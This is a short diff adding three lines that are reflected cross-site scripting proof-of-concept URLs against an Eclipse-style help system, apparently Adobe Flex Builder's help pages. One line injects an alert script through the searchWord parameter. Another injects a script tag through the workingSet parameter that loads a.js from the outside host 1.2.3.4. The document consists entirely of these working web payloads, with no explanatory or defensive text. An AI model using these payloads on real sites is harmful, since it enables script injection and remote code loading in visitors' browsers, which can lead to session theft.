@@ -1,0 +1,3 @@
+http://www.example.com/help/advanced/searchView.jsp?searchWord=a");}alert('xss');</script>
+http://www.example.com/help/advanced/workingSetManager.jsp?operation=add&workingSet='%3E%3Cscript%20src%3D'http%3A%2F%2F1.2.3.4%2Fa.js'%3E%3C%2Fscript%3E
+&hrefs=%2Fcom.adobe.flexbuilder.help.api%2Ftoc.xml&oldName=
